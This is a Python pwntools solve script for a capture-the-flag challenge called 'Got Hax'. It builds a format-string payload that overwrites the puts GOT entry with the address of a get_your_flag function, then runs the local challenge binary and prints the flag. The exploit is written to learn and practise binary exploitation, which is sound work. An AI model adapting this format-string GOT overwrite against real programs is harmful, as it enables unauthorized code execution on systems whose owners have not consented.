#!/usr/bin/env python3

"""
Toast's submission for the challenge Got Hax.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./got_hax")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

# Overwrite puts GOT with flag_function
puts_plt = exe.got['puts']
get_flag = exe.symbols['get_your_flag']

def conn():
    '''Establish the connection to the process
    '''

    exploit = p32(puts_plt)
    exploit += b'%' + str(get_flag - 0x4).encode() + b'x%6$n'
    io = process([exe.path, exploit])
    return io


def main():
    '''Return the flag.
    '''

    with conn() as io:
        io.sendline(b'1')
        io.recvuntil(b'You GOT hax! Your flag is ')
        flag = io.recv()
        log.success(f"Flag is : {flag.decode()}")


if __name__ == '__main__':
    main()
